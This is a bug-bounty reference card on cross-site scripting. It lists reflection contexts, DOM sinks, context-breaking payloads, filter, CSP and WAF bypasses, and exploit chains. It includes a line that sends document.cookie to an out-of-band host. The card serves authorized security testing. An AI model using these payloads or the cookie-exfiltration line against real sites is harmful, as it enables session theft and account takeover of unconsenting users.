# XSS — Bug Knowledge Card
Classe / sous-classe: Client-side injection (reflected, stored, DOM)

Severity ceiling (CVSS): up to 9.0+ — stored XSS in an admin/shared context → session/token
theft → **ATO** → admin → further RCE. Reflected self-contained 6–7; stored cross-user 7–9.

🔭 SPOT TESTS
- Any user input reflected into HTML/JS/attribute/URL: search boxes, profile fields,
  error messages, filenames, HTTP headers echoed back, `Referer`/`User-Agent` reflection.
- DOM sinks in JS bundles: `innerHTML`, `document.write`, `eval`, `location`, `setAttribute`,
  jQuery `$()`, `dangerouslySetInnerHTML`, template `v-html`.
- Markdown/rich-text/WYSIWYG fields, SVG/file uploads, PDF generators.

🧨 EXPLOIT TESTS
1. Inject a unique marker `hbb1337` → find every reflection context (HTML body / attribute /
   JS string / URL / CSS).
2. Context-break per reflection:
   - HTML body: `<svg onload=alert(document.domain)>`
   - attribute: `" autofocus onfocus=alert(1) x="`
   - JS string: `';alert(1);//` or `</script><svg onload=alert(1)>`
   - URL/href: `javascript:alert(1)`
3. Confirm execution with `alert(document.domain)` (prove the real origin), then upgrade PoC
   to cookie/token exfil to an OOB host.
4. Stored: inject, then view as a DIFFERENT user/admin to prove cross-user execution.

🧗 BYPASS TABLE
- Tag/attr filters: alternate tags `<details open ontoggle=>`, `<video><source onerror=>`.
- Keyword filter on `alert`: `top['al'+'ert'](1)`, `confirm`, `print()`.
- Encoding: HTML entities, `alert`, double URL-encoding, mixed case `<ScRiPt>`.
- CSP: find `unsafe-inline`, missing `object-src`, JSONP endpoints, Angular/AngularJS gadget,
  `nonce` reuse, dangling-markup for data exfil when script is blocked.
- WAF: split payload across params, use `<svg>`/`<math>` namespaces, event handlers beyond
  `onerror`/`onload` (`onanimationstart`, `onpointerenter`).

🔗 CHAIN MAP
- XSS → steal session cookie / localStorage token → **ATO**.
- XSS in admin view → CSRF-token theft → admin action → privilege escalation / **RCE**.
- XSS → force request to an IDOR/CSRF-protected endpoint from the victim's origin.
- Self-XSS + login/logout CSRF or clickjacking → delivered XSS (makes self-XSS reportable).

🧪 POC SKELETON
```
https://target/search?q=<svg onload=alert(document.domain)>
→ alert shows target origin  == reflected XSS
Stored: payload saved in field X, fires when admin opens the record.
```
Prove impact: `new Image().src='//oob/c?'+document.cookie` (redact real cookie in report).

📚 REFS: PortSwigger XSS cheatsheet; OWASP XSS; CSP bypass research (LiveOverflow, Masato).
